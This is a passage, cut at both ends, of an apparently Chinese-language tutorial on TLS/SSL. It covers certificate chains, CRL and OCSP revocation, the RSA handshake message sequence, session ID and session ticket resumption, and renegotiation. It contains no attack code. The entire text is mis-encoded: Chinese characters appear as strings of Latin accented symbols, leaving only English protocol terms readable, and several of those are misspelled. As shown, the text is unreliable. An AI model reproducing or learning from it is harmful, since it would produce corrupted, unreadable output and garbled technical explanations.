¹è¯ä¹¦ï¼Œé¢å‘è€…å’Œä½¿ç”¨è€…ç›¸åŒï¼Œè‡ªå·±ä¸ºè‡ªå·±ç­¾åï¼Œå³è‡ªç­¾åè¯ä¹¦ï¼› è¯ä¹¦ = å…¬é’¥ + ç”³è¯·è€…ä¸é¢å‘è€…ä¿¡æ¯ + ç­¾åï¼› è¯ä¹¦é“¾å¦‚ CA æ ¹è¯ä¹¦å’ŒæœåŠ¡å™¨è¯ä¹¦ä¸­é—´å¢åŠ ä¸€å±‚è¯ä¹¦æœºæ„ï¼Œå³ä¸­é—´è¯ä¹¦ï¼Œè¯ä¹¦çš„äº§ç”Ÿå’ŒéªŒè¯åŸç†ä¸å˜ï¼Œåªæ˜¯å¢åŠ ä¸€å±‚éªŒè¯ï¼Œåªè¦æœ€åèƒ½å¤Ÿè¢«ä»»ä½•ä¿¡ä»»çš„ CA æ ¹è¯ä¹¦éªŒè¯åˆæ³•å³å¯ã€‚ æœåŠ¡å™¨è¯ä¹¦ server.pem çš„ç­¾å‘è€…ä¸ºä¸­é—´è¯ä¹¦æœºæ„ interï¼Œinter æ ¹è¯ä¹¦ inter.pem éªŒè¯ server.pem ç¡®å®ä¸ºè‡ªå·±ç­¾å‘çš„æœ‰æ•ˆè¯ä¹¦ï¼› ä¸­é—´è¯ä¹¦ inter.pem çš„ç­¾å‘ CA ä¸º rootï¼Œroot æ ¹æ®è¯ä¹¦ root.pem éªŒè¯ inter.pem ä¸ºè‡ªå·±ç­¾å‘çš„åˆæ³•è¯ä¹¦ï¼› å®¢æˆ·ç«¯å†…ç½®ä¿¡ä»» CA çš„ root.pem è¯ä¹¦ï¼Œå› æ­¤æœåŠ¡å™¨è¯ä¹¦ server.pem è¢«ä¿¡ä»»ã€‚ æœåŠ¡å™¨è¯ä¹¦ã€ä¸­é—´è¯ä¹¦ä¸æ ¹è¯ä¹¦åœ¨ä¸€èµ·ç»„åˆæˆä¸€æ¡åˆæ³•çš„è¯ä¹¦é“¾ï¼Œè¯ä¹¦é“¾çš„éªŒè¯æ—¶è‡ªä¸‹è€Œä¸Šçš„ä¿¡ä»»ä¼ é€’çš„è¿‡ç¨‹ã€‚ äºŒçº§è¯ä¹¦ç»“æ„å­˜åœ¨ä¼˜åŠ¿ï¼š å‡å°‘æ ¹è¯ä¹¦ç»“æ„çš„ç®¡ç†å·¥ä½œé‡ï¼Œå¯ä»¥æ›´é«˜æ•ˆçš„è¿›è¡Œè¯ä¹¦çš„å®¡æ ¸ä¸ç­¾å‘ï¼› æ ¹è¯ä¹¦ä¸€èˆ¬å†…ç½®åœ¨å®¢æˆ·ç«¯ä¸­ï¼Œç§é’¥ä¸€èˆ¬ç¦»çº¿å­˜å‚¨ï¼Œä¸€æ—¦ç§é’¥æ³„æ¼ï¼Œåˆ™åŠé”€è¿‡ç¨‹éå¸¸å›°éš¾ï¼Œæ— æ³•åŠæ—¶è¡¥æ•‘ï¼› ä¸­é—´è¯ä¹¦ç»“æ„çš„ç§é’¥æ³„æ¼ï¼Œåˆ™å¯ä»¥å¿«é€Ÿåœ¨çº¿åŠé”€ï¼Œå¹¶é‡æ–°ä¸ºç”¨æˆ·ç­¾å‘æ–°çš„è¯ä¹¦ï¼› è¯ä¹¦é“¾å››çº§ä»¥å†…ä¸€èˆ¬ä¸ä¼šå¯¹ HTTPS çš„æ€§èƒ½é€ æˆæ˜æ˜¾çš„å½±å“ï¼› è¯ä¹¦é“¾æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š åŒä¸€æœ¬æœåŠ¡å™¨è¯ä¹¦å¯èƒ½å­˜åœ¨å¤šæ¡åˆæ³•çš„è¯ä¹¦é“¾ã€‚å› ä¸ºè¯ä¹¦çš„ç”Ÿæˆå’ŒéªŒè¯åŸºç¡€æ˜¯å…¬é’¥å’Œç§é’¥å¯¹ï¼Œå¦‚æœé‡‡ç”¨ç›¸åŒçš„å…¬é’¥å’Œç§é’¥ç”Ÿæˆä¸åŒçš„ä¸­é—´è¯ä¹¦ï¼Œé’ˆå¯¹è¢«ç­¾å‘è€…è€Œè¨€ï¼Œè¯¥ç­¾å‘æœºæ„éƒ½æ˜¯åˆæ³•çš„ CAï¼Œä¸åŒçš„æ˜¯ä¸­é—´è¯ä¹¦çš„ç­¾å‘æœºæ„ä¸åŒï¼› ä¸åŒè¯ä¹¦é“¾çš„å±‚çº§ä¸ä¸€å®šç›¸åŒï¼Œå¯èƒ½äºŒçº§ã€ä¸‰çº§ã€å››çº§è¯ä¹¦é“¾ã€‚ ä¸­é—´è¯ä¹¦çš„ç­¾å‘æœºæ„å¯èƒ½æ˜¯æ ¹è¯ä¹¦ä¹Ÿå¯èƒ½æ˜¯å¦ä¸€ä¸ªä¸­é—´è¯ä¹¦æœºæ„ï¼Œæ‰€ä»¥è¯ä¹¦é“¾å±‚çº§ä¸ä¸€å®šç›¸åŒã€‚ è¯ä¹¦åŠé”€CA æœºæ„èƒ½å¤Ÿç­¾å‘è¯ä¹¦ï¼ŒåŒæ ·ä¹Ÿå­˜åœ¨æœºåˆ¶å®£å¸ƒä»¥å¾€ç­¾å‘çš„è¯ä¹¦æ— æ•ˆã€‚è¯ä¹¦çš„ä½¿ç”¨è€…ä¸åˆæ³•ï¼ŒCA éœ€è¦åºŸå¼ƒè¯¥è¯ä¹¦ï¼›æˆ–è€…ç§é’¥ä¸¢å¤±ï¼Œä½¿ç”¨è€…ç”³è¯·è®©è¯ä¹¦æ— æ•ˆã€‚ä¸»è¦å­˜åœ¨ä¸¤ç±»æœºåˆ¶ï¼šCRL å’Œ OCSPã€‚ (a) CRL Certificate Revocation List, è¯ä¹¦åŠé”€åˆ—è¡¨ï¼Œä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ã€‚è¯¥æ–‡ä»¶åŒ…å«äº† CA å·²ç»åŠé”€çš„è¯ä¹¦åºåˆ—å·ï¼ˆå”¯ä¸€ï¼‰ä¸åŠé”€æ—¥æœŸï¼ŒåŒæ—¶è¯¥æ–‡ä»¶åŒ…å¥½ç”Ÿæ•ˆæ—¥æœŸå¹¶é€šçŸ¥ä¸‹æ¬¡æ›´æ–°è¯¥æ–‡ä»¶çš„æ—¶é—´ï¼Œå½“ç„¶è¯¥æ–‡ä»¶å¿…ç„¶åŒ…å« CA ç§é’¥çš„ç­¾åä»¥éªŒè¯æ–‡ä»¶çš„åˆæ³•æ€§ã€‚ è¯ä¹¦ä¸­ä¸€èˆ¬ä¼šåŒ…å«ä¸€ä¸ª URL åœ°å€ CRL Distribution Pointï¼Œé€šçŸ¥ä½¿ç”¨è€…å»å“ªé‡Œä¸‹è½½å¯¹åº”çš„ CRL ä»¥æ ¡éªŒè¯ä¹¦æ˜¯å¦åŠé”€ã€‚è¯¥åŠé”€æ–¹å¼çš„ä¼˜ç‚¹æ˜¯ä¸éœ€è¦é¢‘ç¹æ›´æ–°ï¼Œä½†æ˜¯ä¸èƒ½åŠæ—¶åŠé”€è¯ä¹¦ï¼Œå› ä¸º CRL æ›´æ–°æ—¶é—´ä¸€èˆ¬æ˜¯å‡ å¤©ï¼Œè¿™æœŸé—´å¯èƒ½å·²ç»é€ æˆäº†æå¤§çš„æŸå¤±ã€‚ (b) OCSP Online Certificate Status Protocolï¼Œè¯ä¹¦åœ¨çº¿çŠ¶æ€æŸ¥è¯¢åè®®ï¼Œä¸€ä¸ªå®æ—¶æŸ¥è¯¢è¯ä¹¦æ˜¯å¦åŠé”€çš„æ–¹å¼ã€‚è¯·æ±‚è€…å‘é€è¯ä¹¦çš„ä¿¡æ¯å¹¶è¯·æ±‚æŸ¥è¯¢ï¼ŒæœåŠ¡å™¨è¿”å›æ­£å¸¸ã€åŠé”€æˆ–æœªçŸ¥ä¸­çš„ä»»ä½•ä¸€ä¸ªçŠ¶æ€ã€‚è¯ä¹¦ä¸­ä¸€èˆ¬ä¹Ÿä¼šåŒ…å«ä¸€ä¸ª OCSP çš„URLåœ°å€ï¼Œè¦æ±‚æŸ¥è¯¢æœåŠ¡å™¨æ‹¥æœ‰è‰¯å¥½çš„æ€§èƒ½ã€‚éƒ¨åˆ† CA æˆ–å¤§éƒ¨åˆ†çš„è‡ªç­¾ CA ï¼ˆæ ¹è¯ä¹¦ï¼‰éƒ½æ˜¯æœªæä¾› CRL æˆ– OCSP åœ°å€çš„ï¼Œå¯¹äºåŠé”€è¯ä¹¦ä¼šæ˜¯ä¸€ä»¶éå¸¸éº»çƒ¦çš„äº‹æƒ…ã€‚ TLS/SSL æ¡æ‰‹è¿‡ç¨‹æ¡æ‰‹ä¸å¯†é’¥åå•†è¿‡ç¨‹åŸºäº RSA æ¡æ‰‹å’Œå¯†é’¥äº¤æ¢çš„å®¢æˆ·ç«¯éªŒè¯æœåŠ¡å™¨ğŸŒ° client_hello å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚ï¼Œä»¥æ˜æ–‡ä¼ è¾“è¯·æ±‚ä¿¡æ¯ï¼ŒåŒ…å«ä¿æœ¬ä¿¡æ¯ï¼ŒåŠ å¯†å¥—ä»¶å€™é€‰åˆ—è¡¨ï¼Œå‹ç¼©ç®—æ³•å€™é€‰åˆ—è¡¨ï¼Œéšæœºæ•°ï¼Œæ‰©å±•å­—æ®µç­‰ä¿¡æ¯ï¼Œç›¸å…³ä¿¡æ¯å¦‚ä¸‹ï¼š æ”¯æŒçš„æœ€é«˜ç‰ˆæœ¬ TSL åè®®ç‰ˆæœ¬ versionï¼Œä»ä½åˆ°é«˜ä¾æ¬¡ SSLv2ã€SSLv3ã€TLSv1ã€TLSv1.1ã€TLSv1.2ï¼Œå½“å‰åŸºæœ¬ä¸å†ä½¿ç”¨ä½äº TLSv1 çš„ç‰ˆæœ¬ï¼› å®¢æˆ·ç«¯æ”¯æŒçš„åŠ å¯†å¥—ä»¶ cipher suites åˆ—è¡¨ï¼Œæ¯ä¸ªåŠ å¯†å¥—ä»¶å¯¹åº”å‰é¢ TLS åŸç†ä¸­çš„å››ä¸ªåŠŸèƒ½çš„ç»„åˆï¼š è®¤è¯ç®—æ³• AUï¼ˆèº«ä»½è®¤è¯ï¼‰ã€å¯†é’¥äº¤æ¢ç®—æ³• KeyExchangeï¼ˆå¯†é’¥åå•†ï¼‰ã€å¯¹ç§°åŠ å¯†ç®—æ³• Enc (ä¿¡æ¯åŠ å¯†)å’Œä¿¡æ¯æ‘˜è¦ Macï¼ˆå®Œæ•´æ€§æ ¡éªŒï¼‰ï¼› æ”¯æŒçš„å‹ç¼©ç®—æ³• compression methods åˆ—è¡¨ï¼Œç”¨äºåç»­çš„ä¿¡æ¯å‹ç¼©ä¼ è¾“ï¼› éšæœºæ•° random_Cï¼Œç”¨äºåç»­å¯†é’¥çš„ç”Ÿæˆï¼› æ‰©å±•å­—æ®µ extensionsï¼Œæ”¯æŒåè®®ä¸ç®—æ³•çš„ç›¸å…³å‚æ•°ä»¥åŠå®ƒä»¬çš„è¾…åŠ©ä¿¡æ¯ç­‰ï¼Œå¸¸è§çš„ SNI å°±å±äºæ‰©å±•å­—æ®µï¼Œåç»­å•ç‹¬è®¨è®ºè¯¥å­—æ®µçš„ä½œç”¨ã€‚ Server_hello + server_certificate + server_hello_done Server_helloï¼ŒæœåŠ¡ç«¯è¿”å›åå•†çš„ä¿¡æ¯ç»“æœï¼ŒåŒ…æ‹¬ä½¿ç”¨çš„åè®®ç‰ˆæœ¬ versionï¼Œé€‰æ‹©çš„åŠ å¯†å¥—ä»¶ cipher suiteï¼Œé€‰æ‹©çš„å‹ç¼©ç®—æ³• compression methodï¼Œéšæœºæ•° random_S ç­‰ï¼Œå…¶ä¸­éšæœºæ•°ç”¨äºåç»­çš„å¯†é’¥åå•†ï¼› Server_certificationsï¼ŒæœåŠ¡å™¨ç«¯é…ç½®å¯¹åº”çš„è¯ä¹¦é“¾ï¼Œç”¨äºèº«ä»½éªŒè¯å’Œå¯†é’¥äº¤æ¢ï¼› Server_hello_doneï¼Œé€šçŸ¥å®¢æˆ·ç«¯ server_hello ä¿¡æ¯å‘é€ç»“æŸï¼› è¯ä¹¦æ ¡éªŒ å®¢æˆ·ç«¯éªŒè¯è¯ä¹¦çš„åˆæ³•æ€§ï¼Œå¦‚æœéªŒè¯é€šè¿‡æ‰ä¼šè¿›è¡Œåç»­é€šä¿¡ï¼Œå¦åˆ™æ ¹æ®é”™è¯¯æƒ…å†µä¸åŒä½œå‡ºæç¤ºå’Œæ“ä½œï¼Œåˆæ³•æ€§éªŒè¯åŒ…æ‹¬å¦‚ä¸‹ï¼š è¯ä¹¦é“¾çš„å¯ä¿¡æ€§ trusted certificate pathï¼Œæ–¹æ³•å¦‚å‰æ–‡æ‰€è¿°ï¼› è¯ä¹¦æ˜¯å¦åŠé”€ï¼Œæœ‰ä¸¤ç±»æ–¹å¼ç¦»çº¿ CRL å’Œåœ¨çº¿ OCSPï¼Œä¸åŒçš„å®¢æˆ·ç«¯è¡Œä¸ºä¸åŒï¼› æœ‰æ•ˆæœŸ expiry dateï¼Œè¯ä¹¦æ˜¯å¦åœ¨æœ‰æ•ˆæ—¶é—´èŒƒå›´ï¼› åŸŸå domainï¼Œæ ¸æŸ¥è¯ä¹¦åŸŸåæ˜¯å¦ä¸å½“å‰è®¿é—®åŸŸååŒ¹é…ï¼ŒåŒ¹é…è§„åˆ™åç»­åˆ†æï¼› Client_key_exchange + change_cipher_spec + encrypted_hanshake_message Client_key_extangeï¼Œåˆæ³•æ€§éªŒè¯é€šè¿‡åï¼Œå®¢æˆ·ç«¯äº§ç”Ÿéšæœºæ•° Pre-masterï¼Œå¹¶ç”¨è¯ä¹¦å…¬é’¥åŠ å¯†ï¼Œå‘é€ç»™æœåŠ¡å™¨ï¼› æ­¤æ—¶å®¢æˆ·ç«¯å·²ç»è·å–å…¨éƒ¨è®¡ç®—åå•†å¯†é’¥éœ€è¦çš„ä¿¡æ¯ï¼šä¸¤ä¸ªéšæœºæ•° random_C å’Œ random_S ä¸è‡ªå·±è®¡ç®—äº§ç”Ÿçš„ Pre-master, è®¡ç®—å¾—åˆ°çš„åå•†å¯†é’¥ï¼› 1enc_key=Fuc(random_C, random_S, Pre-Master) Change_cipher_specï¼Œå®¢æˆ·ç«¯é€šçŸ¥æœåŠ¡å™¨åç»­çš„é€šä¿¡éƒ½é‡‡ç”¨åå•†çš„å¯†é’¥å’ŒåŠ å¯†ç®—æ³•è¿›è¡ŒåŠ å¯†é€šä¿¡ï¼› Encrypted_hanshake_messageï¼Œç»“åˆä¹‹å‰æ‰€æœ‰é€šè¡Œå‚æ•°çš„ hash å€¼ä¸å…¶ä»–ç›¸å…³ä¿¡æ¯ç”Ÿæˆä¸€æ®µæ•°æ®ï¼Œé‡‡ç”¨åå•†å¯†é’¥ session secret ä¸ç®—æ³•è¿›è¡ŒåŠ å¯†ï¼Œç„¶åå‘é€ç»™æœåŠ¡å™¨ç”¨äºæ•°æ®ä¸æ¡æ‰‹éªŒè¯ï¼› Change_cipher_spec + encrypted_hanshake_message æœåŠ¡å™¨ç”¨ç§é’¥è§£å¯†åŠ å¯†çš„ Pre-master æ•°æ®ï¼ŒåŸºäºä¹‹å‰çš„ä¸¤ä¸ªæ˜æ–‡éšæœºæ•° random_C å’Œ random_Sï¼Œè®¡ç®—å¾—åˆ°åå•†å¯†é’¥ 1enc_key = Fuc(random_C, random_S, Pre_Master); è®¡ç®—ä¹‹å‰æ‰€æœ‰æ¥å—ä¿¡æ¯çš„ hash å€¼ï¼Œç„¶åè§£æå®¢æˆ·ç«¯å‘é€çš„ encrypted_hanshake_messgeï¼ŒéªŒè¯æ•°æ®å’Œå¯†é’¥æ­£ç¡®æ€§ï¼› change_cipher_specï¼ŒéªŒè¯é€šè¿‡åï¼ŒæœåŠ¡å™¨åŒæ ·å‘é€ change_cipher_spec ä»¥å‘ŠçŸ¥å®¢æˆ·ç«¯åç»­çš„é€šä¿¡éƒ½é‡‡ç”¨åå•†çš„å¯†é’¥ä¸ç®—æ³•è¿›è¡ŒåŠ å¯†é€šä¿¡ï¼› Encrypted_hanshake_messageï¼ŒæœåŠ¡å™¨ä¹Ÿç»“åˆæ‰€æœ‰å½“å‰çš„é€šä¿¡å‚æ•°ä¿¡æ¯ç”Ÿæˆä¸€æ®µæ•°æ®å¹¶é‡‡ç”¨åå•†å¯†é’¥ session secret ä¸ç®—æ³•åŠ å¯†å¹¶å‘é€åˆ°å®¢æˆ·ç«¯ï¼› æ¡æ‰‹ç»“æŸ å®¢æˆ·ç«¯è®¡ç®—æ‰€æœ‰æ¥å—ä¿¡æ¯çš„ hash å€¼ï¼Œå¹¶é‡‡ç”¨åå•†å¯†é’¥è§£å¯† encrypted_hanshake_messageï¼ŒéªŒè¯æœåŠ¡å™¨å‘é€çš„æ•°æ®å’Œå¯†é’¥ï¼ŒéªŒè¯é€šè¿‡åˆ™æ¡æ‰‹ç¢—å¥½å®Œæˆï¼› åŠ å¯†é€šä¿¡ å¼€å§‹ä½¿ç”¨åå•†å¯†é’¥ä¸ç®—æ³•è¿›è¡ŒåŠ å¯†é€šä¿¡ æ³¨æ„ï¼š æœåŠ¡å™¨ä¹Ÿå¯ä»¥è¦æ±‚éªŒè¯å®¢æˆ·ç«¯ï¼Œå³åŒå‘è®¤è¯ï¼Œå¯ä»¥åœ¨è¿‡ç¨‹ 2 è¦å‘é€ client_certificate_request ä¿¡æ¯ï¼Œå®¢æˆ·ç«¯åœ¨è¿‡ç¨‹ 4 ä¸­å…ˆå‘é€ client_certificate ä¸ certificate_verify_message ä¿¡æ¯ï¼Œè¯ä¹¦çš„éªŒè¯æ–¹å¼åŸºæœ¬ç›¸åŒï¼Œcertificate_verify_message æ˜¯é‡‡ç”¨ client çš„ç§é’¥åŠ å¯†çš„ä¸€æ®µåŸºäºå·²ç»åå•†çš„é€šä¿¡ä¿¡æ¯å¾—åˆ°çš„æ•°æ®ï¼ŒæœåŠ¡å™¨å¯ä»¥é‡‡ç”¨å¯¹åº”çš„å…¬é’¥è§£å¯†å¹¶éªŒè¯ï¼› æ ¹æ®ä½¿ç”¨çš„å¯†é’¥äº¤æ¢ç®—æ³•çš„ä¸åŒï¼Œå¦‚ ECC ç­‰ï¼Œåå•†ç»†èŠ‚ç•¥æœ‰ä¸åŒï¼Œå¤§ä½“ç±»ä¼¼ï¼› server key exchange çš„ä½œç”¨æ˜¯ server certificate æ²¡æœ‰æºå¸¦è¶³å¤Ÿçš„ä¿¡æ¯æ—¶ï¼Œå‘é€ç»™å®¢æˆ·ç«¯ä»¥è®¡ç®— pre-masterï¼Œå¦‚åŸºäº DH çš„è¯ä¹¦ï¼Œå…¬é’¥ä¸è¢«è¯ä¹¦åŒ…å«ï¼Œéœ€è¦å•ç‹¬å‘é€ï¼› change cipher spec å®é™…å¯ç”¨äºé€šçŸ¥å¯¹ç«¯æ”¹ç‰ˆå½“å‰ä½¿ç”¨çš„åŠ å¯†é€šä¿¡æ–¹å¼ï¼Œå½“å‰æ²¡æœ‰æ·±å…¥åˆ†æï¼› alter message ç”¨äºæŒ‡æ˜åœ¨æ¡æ‰‹æˆ–é€šä¿¡è¿‡ç¨‹ä¸­çš„çŠ¶æ€æ”¹å˜æˆ–é”™è¯¯ä¿¡æ¯ï¼Œä¸€èˆ¬è­¦å‘Šä¿¡æ¯å‡ºå‘æ¡ä»¶æ˜¯è¿æ¥å…³é—­ï¼Œæ”¶ä¸åˆ°åˆæ³•ä¿¡æ¯ï¼Œä¿¡æ¯è§£å¯†å¤±è´¥ï¼Œç”¨æˆ·å–æ¶ˆæ“ä½œç­‰ï¼Œæ”¶åˆ°è­¦å‘Šä¿¡æ¯åï¼Œé€šä¿¡ä¼šè¢«æ–­å¼€æˆ–è€…ç”±æ¥å—æ–¹å†³å®šæ˜¯å¦æ–­å¼€ã€‚ ä¼šè¯ç¼“å­˜æ¡æ‰‹è¿‡ç¨‹ä¸ºäº†åŠ å¿«å»ºç«‹æ¡æ‰‹çš„é€Ÿåº¦ï¼Œå‡å°‘åè®®å¸¦æ¥çš„æ€§èƒ½é™ä½å’Œèµ„æºæ¶ˆè€—ï¼ˆå…·ä½“åˆ†æåœ¨åæ–‡ï¼‰ï¼ŒTLS åè®®æœ‰ä¸¤ç±»ä¼šè¯ç¼“å­˜æœºåˆ¶ï¼šä¼šè¯æ ‡è¯† session ID ä¸ä¼šè¯è®°å½• session ticketã€‚ Session ID ç”±æœåŠ¡å™¨ç«¯æ”¯æŒï¼Œåè®®ä¸­çš„æ ‡å‡†å­—æ®µï¼Œå› æ­¤åŸºæœ¬æ‰€æœ‰çš„æœåŠ¡å™¨éƒ½æ”¯æŒï¼ŒæœåŠ¡å™¨ç«¯ä¿å­˜ä¼šè¯ ID ä»¥åŠåå•†çš„é€šä¿¡ä¿¡æ¯ï¼ŒNginx ä¸­ 1M å†…å­˜çº¦å¯ä»¥ä¿å­˜ 4000 ä¸ª session ID æœºå™¨ç›¸å…³ä¿¡æ¯ï¼Œå ç”¨æœåŠ¡å™¨èµ„æºè¾ƒå¤šï¼› sessoin ticket éœ€è¦æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯éƒ½æ”¯æŒï¼Œå±äºä¸€ä¸ªæ‰©å±•å­—æ®µï¼Œæ”¯æŒèŒƒå›´çº¦60%ï¼ˆæ— å¯é ç»Ÿè®¡æ¥æºï¼‰ï¼Œå°†åå•†çš„é€šä¿¡ä¿¡æ¯åŠ å¯†ä¹‹åå‘é€ç»™å®¢æˆ·ç«¯ä¿å­˜ï¼Œå¯†é’¥åªæœ‰æœåŠ¡å™¨çŸ¥é“ï¼Œå æœ‰æœåŠ¡å™¨èµ„æºå¾ˆå°‘ã€‚ äºŒè€…å¯¹æ¯”ï¼Œä¸»è¦æ˜¯ä¿å­˜åå•†ä¿¡æ¯çš„ä½ç½®ä¸æ–¹å¼ä¸åŒï¼Œç±»ä¼¼äº http ä¸­çš„ session ä¸ cookieã€‚ äºŒè€…éƒ½å­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œï¼ˆnginx å®ç°) ä¼˜å…ˆä½¿ç”¨ session_ticketã€‚ æ¡æ‰‹è¿‡ç¨‹å¦‚ä¸‹å›¾ï¼š æ³¨æ„ï¼šè™½ç„¶æ¡æ‰‹è¿‡ç¨‹ç”± 1.5 ä¸ªæ¥å›ï¼Œä½†æ˜¯æœ€åå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€çš„ç¬¬ä¸€æ¡åº”ç”¨æ•°æ®ä¸éœ€è¦ç­‰å¾…æœåŠ¡å™¨è¿”å›çš„ä¿¡æ¯ï¼Œå› æ­¤æ¡æ‰‹çš„å»¶æ—¶æ˜¯ 1 * RTTã€‚ ä¼šè¯æ ‡è¯† session ID å¦‚æœå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´æ›¾ç»å»ºç«‹è¿‡è¿æ¥ï¼ŒæœåŠ¡å™¨ä¼šåœ¨æ¡æ‰‹æˆåŠŸåè¿”å› session IDï¼Œå¹¶ä¿å­˜å¯¹åº”çš„é€šä¿¡å‚æ•°åœ¨æœåŠ¡å™¨ä¸­ï¼› å¦‚æœå®¢æˆ·ç«¯éœ€è¦å’ŒæœåŠ¡å™¨å†æ¬¡å»ºç«‹è¿æ¥ï¼Œåˆ™åœ¨ client_hello çš„ session ID ä¸­æºå¸¦è®°å½•ä¿¡æ¯ï¼Œå‘é€ç»™æœåŠ¡å™¨ï¼› æœåŠ¡å™¨æ ¹æ®æ”¶åˆ°çš„ session ID æ£€ç´¢ç¼“å­˜è®°å½•ï¼Œå¦‚æœæ²¡æœ‰æ£€ç´¢åˆ°æˆ–ç¼“å­˜è¿‡æœŸï¼Œåˆ™æŒ‰ç…§æ­£å¸¸çš„æ¡æ‰‹è¿›è¡Œï¼› å¦‚æœæ£€ç´¢åˆ°å¯¹åº”çš„ç¼“å­˜è®°å½•ï¼Œåˆ™è¿”å› change_cipher_spec ä¸ encrypted_handshake_message ä¿¡æ¯ï¼Œä¸¤ä¸ªä¿¡æ¯çš„ä½œç”¨ç±»ä¼¼ï¼Œencrypted_handshake_message æ˜¯å½“å‰çš„é€šä¿¡å‚æ•°ä¸ master_secret çš„hash å€¼ï¼› å¦‚æœå®¢æˆ·ç«¯èƒ½å¤ŸéªŒè¯é€šè¿‡æœåŠ¡å™¨åŠ å¯†çš„æ•°æ®ï¼Œåˆ™å®¢æˆ·ç«¯åŒæ ·å‘é€ change_cipher_spec ä¸ encryped_handshake_message ä¿¡æ¯ï¼› æœåŠ¡å™¨éªŒè¯æ•°æ®é€šè¿‡ï¼Œåˆ™æ¡æ‰‹å»ºç«‹æˆåŠŸï¼Œå¼€å§‹è¿›è¡Œæ­£å¸¸çš„æ•°æ®é€šä¿¡ã€‚ ä¼šè¯è®°å½• session ticket å¦‚æœå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹å‰æ›¾ç»å»ºç«‹è¿‡è¿æ¥ï¼ŒæœåŠ¡å™¨ä¼šåœ¨ new_session_ticket æ•°æ®ä¸­æºå¸¦åŠ å¯†çš„ session_ticket ä¿¡æ¯ï¼Œå®¢æˆ·ç«¯ä¿å­˜ï¼› å¦‚æœå®¢æˆ·ç«¯å†æ¬¡å’Œè¯¥æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œåˆ™åœ¨ client_hello çš„æ‰©å±•å­—æ®µ sesion_ticket ä¸­æºå¸¦åŠ å¯†ä¿¡æ¯ï¼Œä¸€èµ·å‘é€ç»™æœåŠ¡å™¨ç«¯ï¼› æœåŠ¡å™¨è§£å¯† session_ticket æ•°æ®ï¼Œå¦‚æœè§£å¯†å¤±è´¥ï¼Œåˆ™æŒ‰ç…§æ­£å¸¸çš„æ¡æ‰‹è¿‡ç¨‹è¿›è¡Œï¼› å¦‚æœè§£å¯†æˆåŠŸï¼Œåˆ™è¿”å› change_cipher_spec å’Œ encryted_handshake_message ä¿¡æ¯ï¼Œä¸¤ä¸ªä¿¡æ¯çš„ä½œç”¨å’Œ session ID ç±»ä¼¼ï¼› å¦‚æœå®¢æˆ·ç«¯èƒ½å¤ŸéªŒè¯æœåŠ¡å™¨åŠ å¯†æ•°æ®ï¼Œåˆ™å®¢æˆ·ç«¯åŒæ ·å‘é€ change_cipher_spec å’Œ encryed_handshake_message ä¿¡æ¯ï¼› æœåŠ¡å™¨éªŒè¯æ•°æ®é€šè¿‡ï¼Œåˆ™æ¡æ‰‹å»ºç«‹æˆåŠŸï¼Œå¼€å§‹è¿›è¡Œæ­£å¸¸çš„åŠ å¯†æ•°æ®é€šä¿¡ã€‚ é‡æ–°è¿æ¥é‡æ–°å»ºç«‹è¿æ¥ï¼Œå³æ”¾å¼ƒæ­£åœ¨ä½¿ç”¨çš„ TSL è¿æ¥ï¼Œé‡æ–°è¿›è¡Œèº«ä»½éªŒè¯å’Œå¯†é’¥åå•†è¿‡ç¨‹ï¼Œç‰¹ç‚¹æ˜¯ä¸éœ€è¦æ–­å¼€å½“å‰çš„æ•°æ®ä¼ è¾“å°±å¯ä»¥é‡æ–°èº«ä»½è®¤è¯ã€æ›´æ–°å¯†é’¥æˆ–ç®—æ³•ï¼Œå› æ­¤æœåŠ¡å™¨ç«¯å­˜å‚¨å’Œç¼“å­˜çš„ä¿¡æ¯éƒ½å¯ä»¥ä¿æŒã€‚å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯éƒ½å¯ä»¥å‘èµ·é‡æ–°è¿æ¥è¿‡ç¨‹ï¼Œå½“å‰çš„ windows 2000 &amp; xp ä¸ SSL 2.0 ä¸æ”¯æŒã€‚ æœåŠ¡å™¨é‡æ–°è¿æ¥ æœåŠ¡å™¨é‡å»ºè¿æ¥ä¸€èˆ¬æƒ…å†µæ˜¯å®¢æˆ·ç«¯è®¿é—®å—ä¿æŠ¤çš„æ•°æ®æ—¶å‘ç”Ÿã€‚åŸºæœ¬è¿‡ç¨‹å¦‚ä¸‹ï¼š (a) å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å»ºç«‹äº†æœ‰æ•ˆçš„ TLS è¿æ¥å¹¶é€šä¿¡ï¼› (b) å®¢æˆ·ç«¯è®¿é—®å—ä¿æŠ¤çš„ä¿¡æ¯ï¼› (c) æœåŠ¡ç«¯è¿”å› hello_request ä¿¡æ¯ï¼› (d) å®¢æˆ·ç«¯æ”¶åˆ° hello_request ä¿¡æ¯åï¼Œå‘é€ client_hello ä¿¡æ¯ï¼Œå¼€å§‹é‡æ–°å»ºç«‹è¿æ¥ã€‚ å®¢æˆ·ç«¯é‡æ–°è¿æ¥ å®¢æˆ·ç«¯é‡æ–°è¿æ¥ä¸€èˆ¬æ˜¯ä¸ºäº†æ›´æ–°å¯†é’¥ã€‚ å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨å»ºç«‹äº†æœ‰æ•ˆçš„ TLS è¿æ¥å¹¶é€šä¿¡ï¼› å®¢æˆ·ç«¯éœ€è¦æ›´æ–°å¯†é’¥ä¸»åŠ¨å‘èµ·äº† client_hello ä¿¡æ¯ï¼› æœåŠ¡å™¨æ”¶åˆ° client_hello ä¿¡æ¯åï¼Œæ— æ³•ç«‹å³è¯†åˆ«å‡ºè¯¥æ•°æ®ä¸ºéåº”ç”¨æ•°æ®ï¼Œå› æ­¤ä¼šæäº¤ç»™ä¸‹ä¸€æ­¥å¤„ç†ï¼Œå¤„ç†å®Œåä¼šè¿”å›é€šçŸ¥è¯¥ä¿¡æ¯ä¸ºè¦æ±‚é‡æ–°è¿æ¥è¿‡ç¨‹ï¼› 